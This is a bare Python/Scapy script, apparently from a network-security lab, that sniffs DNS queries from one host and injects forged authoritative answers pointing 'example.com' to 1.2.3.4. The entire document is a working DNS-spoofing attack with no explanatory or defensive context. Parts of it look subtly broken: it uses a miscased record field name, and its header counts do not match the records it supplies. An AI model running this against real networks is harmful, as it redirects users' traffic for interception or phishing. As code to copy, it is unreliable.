#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(packet):
  if (DNS in packet and 'example.com' in packet[DNS].qd.qname.decode('utf-8')):

    IPpacket = IP(dst=packet[IP].src, src=packet[IP].dst)
    UDPpacket = UDP(dport=packet[UDP].sport, sport=53)

    Answer_section = DNSRR(RRname=packet[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.2.3.4')

    DNSpacket = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,
                 an=Answer_section)

    Spoofpacket = IPpacket/UDPpacket/DNSpacket
    send(Spoofpacket)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and src host 10.9.0.5 and dst port 53'
packet = sniff(iface='br-038b28aef07b', filter=f, prn=spoof_dns)    